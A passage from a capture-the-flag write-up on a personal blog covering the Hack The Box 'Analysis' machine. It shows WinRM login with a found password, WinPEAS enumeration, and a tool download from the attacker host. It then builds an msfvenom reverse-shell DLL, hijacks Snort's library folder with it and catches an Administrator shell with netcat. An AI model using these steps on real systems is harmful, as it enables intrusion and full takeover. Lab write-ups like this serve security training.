</span></span></span></code></pre></div><ul><li>I decide to check with <code>NetExec</code> if we have access to the machine with these credentials and we do:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec winrm 10.10.11.250 -u &#39;jdoe&#39; -p &#39;7y4Z4^*y9Zzj&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>WINRM       10.10.11.250    5985   DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 (name:DC-ANALYSIS) (domain:analysis.htb)
</span></span></span><span class=line><span class=cl><span class=go>WINRM       10.10.11.250    5985   DC-ANALYSIS      [+] analysis.htb\jdoe:7y4Z4^*y9Zzj (Pwn3d!)
</span></span></span></code></pre></div><p>and connect with <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ evil-winrm -i 10.10.11.250 -u &#39;jdoe&#39; -p &#39;7y4Z4^*y9Zzj&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Evil-WinRM shell v3.5
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Establishing connection to remote endpoint
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt;
</span></span></span></code></pre></div><p>where we can finally get the user flag at <code>C:\Users\jdoe\Desktop</code></p><h2 id=nt-authoritysystem---administrator>NT Authority/System - Administrator
<a class=heading-link href=#nt-authoritysystem---administrator><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>From <code>WinPEAS</code>, but now re-uploading it and running it as <code>jdoe</code> user I can see something from the output:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; wget http://10.10.16.15:8080/winpeas.exe -Outfile C:\Users\jdoe\Documents\winpeas.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; C:\Users\jdoe\Documents\winpeas.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>Snort(Snort)[C:\Snort\bin\snort.exe /SERVICE] - Autoload - No quotes and Space detected
</span></span></span><span class=line><span class=cl><span class=go>    Possible DLL Hijacking in binary folder: C:\Snort\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><ul><li>Searching <code>What is Snort</code> on Google I get:</li></ul><blockquote><p>SNORT is a powerful open-source intrusion detection system (IDS) and intrusion prevention system (IPS) that provides real-time network traffic analysis and data packet logging. SNORT uses a rule-based language that combines anomaly, protocol, and signature inspection methods to detect potentially malicious activity</p></blockquote><p>So attacking <code>SNORT</code> could be a potential way to get privileges</p><ul><li>Checking the permissions with <code>icacls</code> show that we might be able to write on these files:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; icacls C:\Snort\lib\snort_dynamicengine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Snort\lib\snort_dynamicengine AUTORITE NT\Syst≈†me:(I)(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                                 BUILTIN\Administrateurs:(I)(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                                 BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go>                                 BUILTIN\Utilisateurs:(I)(CI)(AD)
</span></span></span><span class=line><span class=cl><span class=go>                                 BUILTIN\Utilisateurs:(I)(CI)(WD)
</span></span></span><span class=line><span class=cl><span class=go>                                 CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Successfully processed 1 files; Failed processing 0 files
</span></span></span><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; icacls C:\Snort\lib\snort_dynamicpreprocessor
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Snort\lib\snort_dynamicpreprocessor AUTORITE NT\Syst≈†me:(I)(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                                       BUILTIN\Administrateurs:(I)(OI)(CI)(F)
</span></span></span><span class=line><span class=cl><span class=go>                                       BUILTIN\Utilisateurs:(I)(OI)(CI)(RX)
</span></span></span><span class=line><span class=cl><span class=go>                                       BUILTIN\Utilisateurs:(I)(CI)(AD)
</span></span></span><span class=line><span class=cl><span class=go>                                       BUILTIN\Utilisateurs:(I)(CI)(WD)
</span></span></span><span class=line><span class=cl><span class=go>                                       CREATEUR PROPRIETAIRE:(I)(OI)(CI)(IO)(F)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Successfully processed 1 files; Failed processing 0 files
</span></span></span></code></pre></div><ul><li>I note that within these files we have a <code>.dll</code> file, so we might try a <code>DLL hijacking</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; cmd.exe /c dir C:\Snort\lib\snort_dynamicengine
</span></span></span><span class=line><span class=cl><span class=go> Volume in drive C has no label.
</span></span></span><span class=line><span class=cl><span class=go> Volume Serial Number is 0071-E237
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> Directory of C:\Snort\lib\snort_dynamicengine
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>07/08/2023  03:31 PM    &lt;DIR&gt;          .
</span></span></span><span class=line><span class=cl><span class=go>07/08/2023  03:31 PM    &lt;DIR&gt;          ..
</span></span></span><span class=line><span class=cl><span class=go>05/24/2022  06:48 AM            78,336 sf_engine.dll
</span></span></span><span class=line><span class=cl><span class=go>               1 File(s)         78,336 bytes
</span></span></span><span class=line><span class=cl><span class=go>               2 Dir(s)   4,018,229,248 bytes free
</span></span></span></code></pre></div><ul><li>For this I create a <code>.dll</code> file with <code>msfvenom</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.15 LPORT=443 -a x64 -f dll -o snort_dynamicpreprocessor.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span></span><span class=line><span class=cl><span class=go>No encoder specified, outputting raw payload
</span></span></span><span class=line><span class=cl><span class=go>Payload size: 460 bytes
</span></span></span><span class=line><span class=cl><span class=go>Final size of dll file: 9216 bytes
</span></span></span><span class=line><span class=cl><span class=go>Saved as: snort_dynamicpreprocessor.dll
</span></span></span></code></pre></div><p>pass it to the machine with the help of <code>evil-winrm</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; upload snort_dynamicpreprocessor.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Uploading /home/gunzf0x/HTB/HTBMachines/Hard/Analysis/exploits/snort_dynamicpreprocessor.dll to C:\Users\jdoe\Documents\snort_dynamicpreprocessor.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Data: 12288 bytes of 12288 bytes copied
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Info: Upload successful!
</span></span></span></code></pre></div><ul><li>I will create a copy of the original files and, then, replace them with the malicious <code>.dll</code> file:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; dir C:\Snort\lib
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\Snort\lib
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----         7/8/2023   3:31 PM                snort_dynamicengine
</span></span></span><span class=line><span class=cl><span class=go>d-----         7/8/2023   3:31 PM                snort_dynamicpreprocessor
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; copy C:\Snort\lib\snort_dynamicpreprocessor .\snort_dynamic_backup
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\Users\jdoe\Documents
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>d-----        5/23/2023   9:15 AM                BCDB
</span></span></span><span class=line><span class=cl><span class=go>d-----        5/19/2024   5:29 AM                snort_dynamic_backup
</span></span></span><span class=line><span class=cl><span class=go>-a----        5/19/2024   5:28 AM           9216 snort_dynamicpreprocessor.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        5/19/2024   5:09 AM        2387456 winpeas.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; copy snort_dynamicpreprocessor.dll C:\Snort\lib\snort_dynamicpreprocessor
</span></span></span></code></pre></div><ul><li>Finally, start the service. I note that there is a <code>snort.exe</code> file at <code>C:\Snort\bin</code> directory. Before doing this I start a listener with <code>netcat</code> on port <code>443</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>*Evil-WinRM* PS C:\Users\jdoe\Documents&gt; cd C:\Snort\bin
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Snort\bin&gt; dir
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>    Directory: C:\Snort\bin
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mode                LastWriteTime         Length Name
</span></span></span><span class=line><span class=cl><span class=go>----                -------------         ------ ----
</span></span></span><span class=line><span class=cl><span class=go>-a----        4/20/2022   4:15 PM          54784 npptools.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        4/20/2022   4:15 PM         274489 ntwdblib.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        4/20/2022   4:15 PM          36948 Packet.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        4/20/2022   4:15 PM          94208 pcre.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        5/24/2022   6:51 AM        1559552 snort.exe
</span></span></span><span class=line><span class=cl><span class=go>-a----        4/20/2022   4:15 PM          53326 WanPacket.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        4/20/2022   4:15 PM         208974 wpcap.dll
</span></span></span><span class=line><span class=cl><span class=go>-a----        4/20/2022   4:15 PM          73728 zlib1.dll
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>*Evil-WinRM* PS C:\Snort\bin&gt; .\snort.exe -V
</span></span></span><span class=line><span class=cl><span class=go>snort.exe :
</span></span></span><span class=line><span class=cl><span class=go>    + CategoryInfo          : NotSpecified: (:String) [], RemoteException
</span></span></span><span class=line><span class=cl><span class=go>    + FullyQualifiedErrorId : NativeCommandError
</span></span></span><span class=line><span class=cl><span class=go>   ,,_     -*&gt; Snort! &lt;*-  o&#34;  )~   Version 2.9.20-WIN64 GRE (Build 82)    &#39;&#39;&#39;&#39;    By Martin Roesch &amp; The Snort Team: http://www.snort.org/contact#team           Copyright (C) 2014-2022 Cisco and/or its affiliates. All rights reserved.           Copyright (C) 1998-2013 Sourcefire, Inc., et al.           Using PCRE version: 8.10 2010-06-25           Using ZLIB version: 1.2.11
</span></span></span></code></pre></div><ul><li>And after some seconds I get a shell as <code>Administrator</code> user:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.15] from (UNKNOWN) [10.10.11.250] 51511
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [Version 10.0.17763.5329]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. All rights reserved.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\Windows\system32&gt;whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>analysis\administrateur
</span></span></span></code></pre></div><p>where we can get the flag at <code>C:\Users\Administrateur\Desktop\</code></p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>